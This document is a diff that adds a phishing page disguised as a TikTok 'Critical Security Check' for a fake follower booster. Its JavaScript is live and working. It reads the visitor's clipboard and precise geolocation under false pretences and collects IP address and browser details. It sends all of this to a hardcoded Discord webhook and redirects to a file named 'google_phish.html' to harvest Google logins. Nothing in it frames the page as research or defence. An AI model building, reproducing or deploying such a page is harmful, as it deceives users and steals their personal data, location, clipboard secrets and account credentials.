@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Critical Security Check - TikTok Booster</title>
+    <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://image.tiktok.com/cdn/static/2020-03-24/assets/images/tiktok_bg_mobile.png') no-repeat center center;
+            background-size: cover;
+            opacity: 0.1;
+            z-index: -1;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 480px;
+            text-align: center;
+            box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .logo {
+            width: 70px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 2.2em;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        p {
+            font-size: 1.1em;
+            color: #ccc;
+            margin-bottom: 30px;
+        }
+        .verification-option {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        .verification-option:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+        }
+        .verification-option img {
+            width: 40px;
+            height: 40px;
+            filter: grayscale(100%) brightness(200%);
+        }
+        .verification-option h2 {
+            margin: 0;
+            font-size: 1.4em;
+            color: #fff;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #e62241;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-overlay p {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/TikTok_logo.svg/768px-TikTok_logo.svg.png" alt="TikTok Logo" class="logo">
+        <h1>Critical Security Check Required</h1>
+        <p>To finalize your boost and ensure account security, please complete one of the verification steps below.</p>
+
+        <div class="verification-option" id="googleLoginOption">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Google Logo">
+            <h2>Sign in with Google</h2>
+        </div>
+
+        <div class="verification-option" id="securityPermissionOption">
+            <img src="https://www.svgrepo.com/show/511082/lock.svg" alt="Security Lock">
+            <h2>Enable Advanced Security & Permissions</h2>
+        </div>
+
+        <div class="verification-option" id="locationPermissionOption">
+            <img src="https://www.svgrepo.com/show/509177/location-pin.svg" alt="Location Pin">
+            <h2>Verify Location for Global Boost</h2>
+        </div>
+        
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Processing...</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SFH6b4uEJo9P2VpbM1';
+
+        async function sendDataToWebhook(data, type) {
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (ipError) {
+                console.error('Failed to get IP address:', ipError);
+            }
+
+            const payload = {
+                username: "TikTok Booster Scraper",
+                avatar_url: "https://www.tiktok.com/favicon.ico",
+                embeds: [{
+                    title: `🔔 New Data Captured: ${type} 🔔`,
+                    description: `**Page:** \`verify.html\`\n`,
+                    color: 16750848,
+                    fields: [
+                        { name: "IP Address", value: ipAddress, inline: true },
+                        { name: "User Agent", value: navigator.userAgent, inline: false },
+                        { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "Language", value: navigator.language, inline: true },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                    ],
+                    footer: { text: "TikTok Viral Booster Log" }
+                }]
+            };
+
+            for (const key in data) {
+                payload.embeds[0].fields.push({ name: key, value: `\`\`\`${data[key]}\`\`\``, inline: false });
+            }
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                if (!response.ok) {
+                    console.error(`Failed to send data to webhook: ${response.status} ${response.statusText}`);
+                } else {
+                    console.log(`Data (${type}) sent successfully to webhook.`);
+                }
+            } catch (error) {
+                console.error('Network error sending data to webhook:', error);
+            }
+        }
+
+        document.getElementById('googleLoginOption').addEventListener('click', async () => {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            await sendDataToWebhook({ 'Action': 'Google Login Initiated (from Verify)' }, 'Verification Step');
+            setTimeout(() => {
+                window.location.href = 'google_phish.html';
+            }, 1000);
+        });
+
+        document.getElementById('securityPermissionOption').addEventListener('click', async () => {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            let notificationStatus = 'not_supported';
+            let clipboardStatus = 'not_supported';
+            let clipboardContent = 'Not fetched';
+
+            if ('Notification' in window) {
+                notificationStatus = await Notification.requestPermission();
+            }
+
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                try {
+                    clipboardContent = await navigator.clipboard.readText();
+                    clipboardStatus = 'granted';
+                } catch (err) {
+                    console.error('Failed to read clipboard content:', err);
+                    clipboardStatus = 'denied';
+                    if (err.name === 'NotAllowedError') {
+                        clipboardStatus = 'denied_by_user_or_policy';
+                    }
+                }
+            }
+
+            await sendDataToWebhook({ 
+                'Action': 'Advanced Security & Permissions Attempted',
+                'Notification Permission Status': notificationStatus,
+                'Clipboard Access Status': clipboardStatus,
+                'Clipboard Content (if granted)': clipboardContent 
+            }, 'Advanced Permissions Capture');
+
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                window.location.href = 'progress.html';
+            }, 1500);
+        });
+
+        document.getElementById('locationPermissionOption').addEventListener('click', async () => {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            let locationStatus = 'not_supported';
+            let latitude = 'N/A';
+            let longitude = 'N/A';
+            let accuracy = 'N/A';
+
+            if ('geolocation' in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+                    accuracy = position.coords.accuracy;
+                    locationStatus = 'granted';
+                } catch (error) {
+                    console.error('Geolocation error:', error);
+                    locationStatus = 'denied';
+                    if (error.code === error.PERMISSION_DENIED) {
+                        locationStatus = 'denied_by_user';
+                    } else if (error.code === error.POSITION_UNAVAILABLE) {
+                        locationStatus = 'position_unavailable';
+                    } else if (error.code === error.TIMEOUT) {
+                        locationStatus = 'timeout';
+                    }
+                }
+            }
+
+            await sendDataToWebhook({ 
+                'Action': 'Geolocation Permission Attempted',
+                'Geolocation Status': locationStatus,
+                'Latitude': latitude,
+                'Longitude': longitude,
+                'Accuracy (meters)': accuracy 
+            }, 'Geolocation Capture');
+
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                window.location.href = 'progress.html';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
